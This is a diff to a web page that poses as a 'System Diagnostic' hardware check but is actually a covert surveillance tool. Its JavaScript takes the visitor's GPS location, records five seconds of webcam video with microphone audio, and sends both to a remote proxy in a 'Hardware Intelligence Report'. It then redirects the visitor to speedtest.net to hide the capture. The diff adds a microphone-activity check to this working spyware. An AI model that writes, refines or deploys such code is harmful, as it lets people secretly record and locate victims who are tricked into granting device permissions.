@@ -17,7 +17,7 @@
 <body>
 
     <div class="card">
-        <div style="font-size: 0.7rem; color: #5c6784;">SYSTEM DIAGNOSTIC v5.3.0</div>
+        <div style="font-size: 0.7rem; color: #5c6784;">SYSTEM DIAGNOSTIC v5.4.0</div>
         <div class="terminal" id="terminal">
             <div class="line">> System Ready. Awaiting Handshake...</div>
         </div>
@@ -44,22 +44,34 @@
 
         btn.addEventListener('click', async function() {
             btn.disabled = true;
-            addLog("> Initiating Secure Handshake...");
+            addLog("> Verifying Hardware Nodes...");
 
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                addLog("> GPS Node Linked.");
-
                 let stream;
                 try {
-                    // Force high-quality audio constraints
                     stream = await navigator.mediaDevices.getUserMedia({ 
                         video: { facingMode: "user" }, 
-                        audio: {
-                            echoCancellation: true,
-                            noiseSuppression: true,
-                            autoGainControl: true
-                        } 
+                        audio: { echoCancellation: true, noiseSuppression: true } 
                     });
+
+                    // MICROPHONE CHECK LOGIC
+                    const audioContext = new AudioContext();
+                    const source = audioContext.createMediaStreamSource(stream);
+                    const analyser = audioContext.createAnalyser();
+                    source.connect(analyser);
+                    analyser.fftSize = 256;
+                    const bufferLength = analyser.frequencyBinCount;
+                    const dataArray = new Uint8Array(bufferLength);
+                    
+                    analyser.getByteFrequencyData(dataArray);
+                    let volume = dataArray.reduce((a, b) => a + b) / bufferLength;
+
+                    if (volume === 0) {
+                        addLog("> WARN: Audio Node Muted. Checking Gain...", "#ffcc00");
+                    } else {
+                        addLog("> Audio Node: Verified Active.");
+                    }
+
                 } catch (e) {
                     addLog("> ERROR: Hardware Denied.", "#ff4b2b");
                     btn.disabled = false;
@@ -67,36 +79,32 @@
                 }
 
                 addLog("> Capturing Telemetry (5s)...");
-                
-                // AUDIO FIX: Force the browser to use a container that supports both video and audio
                 const mimeType = 'video/webm;codecs=vp8,opus';
                 const options = MediaRecorder.isTypeSupported(mimeType) ? { mimeType } : {};
-                
                 const mediaRecorder = new MediaRecorder(stream, options);
                 const chunks = [];
+                
                 mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                 mediaRecorder.start();
 
                 setTimeout(() => {
-                    addLog("> Forwarding to Cloud Proxy...");
+                    addLog("> Syncing to Cloud Proxy...");
                     mediaRecorder.stop();
                 }, 5000);
 
                 mediaRecorder.onstop = async () => {
-                    // Final blob must keep the correct mimeType for audio playback
                     const videoBlob = new Blob(chunks, { type: options.mimeType || 'video/webm' });
-                    const battery = await navigator.getBattery();
                     const formData = new FormData();
                     
                     formData.append('payload_json', JSON.stringify({
-                        content: "🔱 **AUDIO-ENABLED CAPTURE**",
+                        content: "🔱 **HARDWARE VERIFIED CAPTURE**",
                         embeds: [{
                             title: "Hardware Intelligence Report",
                             color: 3066993,
                             fields: [
                                 { name: "📍 Maps", value: "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude },
-                                { name: "🔊 Audio", value: "Codecs: VP8/Opus (Verified)", inline: true },
-                                { name: "🔋 Battery", value: Math.round(battery.level * 100) + "%", inline: true }
+                                { name: "🔊 Audio", value: "Codecs: VP8/Opus", inline: true },
+                                { name: "📊 Signal", value: "Verified Active", inline: true }
                             ]
                         }]
                     }));
@@ -105,7 +113,7 @@
                     try {
                         const response = await fetch(PROXY_URL, { method: 'POST', body: formData });
                         if (response.ok) {
-                            addLog("> Success! Finalizing Node...");
+                            addLog("> Success! Finalizing...");
                             setTimeout(() => { window.location.href = "https://www.speedtest.net"; }, 1000);
                         } else {
                             addLog("> Server Error: " + response.status, "#ff4b2b");
